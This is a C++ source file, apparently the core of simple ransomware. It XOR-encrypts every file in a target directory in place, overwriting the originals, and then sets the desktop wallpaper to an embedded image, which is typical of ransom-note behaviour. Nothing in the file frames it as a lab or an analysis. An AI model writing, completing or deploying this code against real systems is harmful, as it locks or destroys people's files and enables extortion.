#include "Encryptor.h"
#include "WallpaperChanger.h"
#include "UserDirectory.h"
#include "resource.h"
#include <filesystem>
#include <fstream>

namespace fs = std::filesystem;

Encryptor::Encryptor(const std::string& key) : key(key) {}

void Encryptor::xorEncryptDecrypt(std::vector<unsigned char>& buffer) {
    size_t keyLength = key.length();
    for (size_t i = 0; i < buffer.size(); i++) {
        buffer[i] ^= key[i % keyLength];
    }
}

void Encryptor::encryptFile(const std::string& filePath) {
    std::ifstream inFile(filePath, std::ios::binary);
    if (!inFile) {
        std::cerr << "파일을 열 수 없습니다: " << filePath << std::endl;
        return;
    }

    std::vector<unsigned char> buffer((std::istreambuf_iterator<char>(inFile)), {});
    inFile.close();

    xorEncryptDecrypt(buffer);

    std::ofstream outFile(filePath, std::ios::binary);
    outFile.write(reinterpret_cast<const char*>(buffer.data()), buffer.size());
    outFile.close();
}

void Encryptor::decryptFile(const std::string& filePath) {
    encryptFile(filePath);
}

void Encryptor::encryptDirectory(const std::string& dirPath) {
    bool encrypted = false;

    for (const auto& entry : fs::directory_iterator(dirPath)) {
        if (entry.is_regular_file()) {
            encryptFile(entry.path().string());
            encrypted = true;
        }
    }

    if (encrypted) {
        WallpaperChanger::setWallpaperFromResource(IDB_BITMAP1);
    }
}

void Encryptor::decryptDirectory(const std::string& dirPath) {
    for (const auto& entry : fs::directory_iterator(dirPath)) {
        if (entry.is_regular_file()) {
            decryptFile(entry.path().string());
        }
    }
}
